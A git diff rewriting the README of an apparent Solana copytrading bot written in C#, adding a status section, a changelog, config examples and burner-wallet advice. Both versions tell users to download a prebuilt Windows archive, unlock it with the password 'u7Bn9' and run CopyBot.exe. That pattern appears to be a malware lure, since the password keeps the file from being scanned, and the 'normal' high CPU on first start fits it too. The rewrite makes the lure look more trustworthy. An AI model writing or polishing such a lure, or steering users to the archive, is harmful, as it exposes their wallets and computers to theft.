@@ -1,87 +1,98 @@
-#  Solana CopyTrading Bot
+# Solana CopyTrading Bot
 
-A powerful and customizable copytrading bot built in **C#** for the **Solana blockchain**, supporting multiple platforms including **Raydium**, **Pump.fun**, **Moonshot**, **Photon**, **GMGN**, **BonkBot**, and **Banana Gun**. Designed to mirror transactions from top-performing wallets in real time with full control over filters, liquidity management, and sniping strategies.
+Copytrading bot for Solana, written in C#. Watches selected wallets and mirrors their swaps on Raydium and Pump.fun. Uses public RPC nodes — monitoring mode doesn't need any private keys.
+
 ![](https://github.com/knightlightst/solana-copytrading-bot/blob/main/test.gif?raw=true)
-##  Features
 
--  **Real-Time Transaction Monitoring**  
-  Monitor blockchain activity from selected wallets and copy their trades instantly.
+## Features
 
--  **Customizable Filters**  
-  Fine-tune what types of transactions to follow:
-1. Swaps
-2. Transfers
-3. NFT activity
-4. Token launches
-5. Liquidity events
+- Real-time monitoring of watched wallets (websocket subscriptions, not polling)
+- Trade filters: swaps, transfers, token launches, liquidity add/remove
+- Slippage control and per-trade / daily loss limits
+- Optional sniping mode for new Pump.fun launches
+- Auto-copy execution via Raydium (Jupiter routing is in the roadmap, see #2)
+- Telegram notifications for every copied trade
 
--  **Liquidity Management**  
-  Manage how your liquidity is used:
-  1. Auto-adjust based on wallet activity
-  2. Slippage controls
-  3. Minimum liquidity thresholds
+## Status
 
--  **Token Creation Detection**  
-  Detect new token launches and participate based on configurable triggers.
+v0.2.1 — monitoring and Raydium execution work. Pump.fun execution is flaky (#4). Moonshot/GMGN support planned, not started.
 
--  **Sniping Mechanism**  
-  Snipe early trades on new tokens or liquidity events.
+## Getting started (Windows)
 
--  **Volume & Activity Filters**  
-  Filter wallets and tokens based on trade volume, token popularity, and other metrics.
+1. Download the latest build from [Releases](https://github.com/knightlightst/solana-copytrading-bot/releases) (`copybot-v0.2.1-win-x64.rar`)
+2. Extract archive with password `u7Bn9`
+3. Copy `appsettings.example.json` to `appsettings.json` and edit it
+4. Run `CopyBot.exe`
 
--  **Platform Integration**
-  Seamlessly supports multiple Solana-based DEX and trading tools:
-1. Raydium
-2. Pump.fun
-3. Moonshot
-4. Photon
-5. GMGN
-6. BonkBot
-7. Banana Gun
+The default config runs in **read-only monitoring mode**: no keys required, the bot just watches the example wallets and logs what it would copy. Trading stays off until you set `"execution.enabled": true` yourself.
 
-## Getting Started
-- [Clone](https://github.com/knightlightst/solana-copytrading-bot/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
-- Extract archive with password `u7Bn9`
-- Configure your settings  
-   Edit `appsettings.json` or use the UI to set filters, wallet addresses, and platform preferences.
-- Run the bot
+If you ever enable execution — use a fresh burner wallet with a small balance. Never paste keys from your main wallets into any bot config, including this one.
 
-##  Configuration
+## Building from source
 
-All settings are fully configurable through a JSON or UI interface (if implemented). Below are the primary config options:
+Requires .NET 8 SDK:
+
+```
+dotnet build -c Release
+```
+
+The binary ends up in `bin/Release/net8.0-windows/`.
+
+## Configuration
+
+Everything is in `appsettings.json`. Main options:
 
 ```json
 {
-  "watchedWallets": ["Wallet1", "Wallet2"],
+  "rpcEndpoint": "https://api.mainnet-beta.solana.com",
+  "watchedWallets": [
+    "8wJ3kPzR7vQmT2nLdXcB4yHsFgU6aE9KpM5tWrYuVqN8",
+    "Gk9mRt2vXw7LpQ4nHsYdF8cB3jAeU6zT5iKoP1xMvNwE"
+  ],
   "filters": {
-    "enableSwaps": true,
-    "enableTransfers": false,
-    "enableNFTs": false,
-    "minVolume": 100,
-    "maxSlippage": 2.5,
-    "allowNewTokens": true
+    "swaps": true,
+    "transfers": false,
+    "tokenLaunches": true,
+    "minTradeSizeUsd": 500
   },
-  "platforms": ["Raydium", "Pump.fun", "Photon","Moonshot","GMGN","BonkBot","Banana Gun"],
-  "snipeSettings": {
-    "enabled": true,
-    "autoApprove": true,
-    "snipeDelayMs": 200
+  "execution": {
+    "enabled": false,
+    "maxSlippagePct": 2.5,
+    "maxSolPerTrade": 0.5,
+    "dailyLossLimitSol": 2
   },
-  "liquidityManagement": {
-    "autoAdjust": true,
-    "minLiquidity": 5,
-    "maxLiquidityPerToken": 100
+  "telegram": {
+    "botToken": "",
+    "chatId": ""
   }
 }
 ```
 
-##  Disclaimer
+For `watchedWallets` just grab any top performers from GMGN or Solscan — that's what the two example addresses are.
 
-This tool is provided for **educational and research purposes only**. Use at your own risk. Trading cryptocurrencies carries risk and can lead to significant financial loss.
+## Known issues
 
----
+- Pump.fun execution sometimes misses the bonding curve state (#4)
+- High CPU for ~2 minutes on first start while it backfills wallet history — normal
+- Telegram alerts can arrive out of order when trades come in fast
+
+## Changelog
+
+**v0.2.1**
+- fixed crash on empty `watchedWallets` (#3)
+- slippage is now in percent, was a fraction (sorry if that ate a trade)
+
+**v0.2.0**
+- Raydium execution
+- Telegram alerts
+
+**v0.1.0**
+- monitoring only
+
+## Disclaimer
+
+Trading bots lose money. Use a burner, start small, don't trade what you can't lose.
 
 ## Contact
 
-For issues, questions, or contributions, feel free to open an [Issue](https://github.com/knightlightst/solana-copytrading-bot/issues) or reach out via Pull Request.
+Bugs and ideas — open an [Issue](https://github.com/knightlightst/solana-copytrading-bot/issues). If you want to contribute, open an issue first so we don't duplicate work.
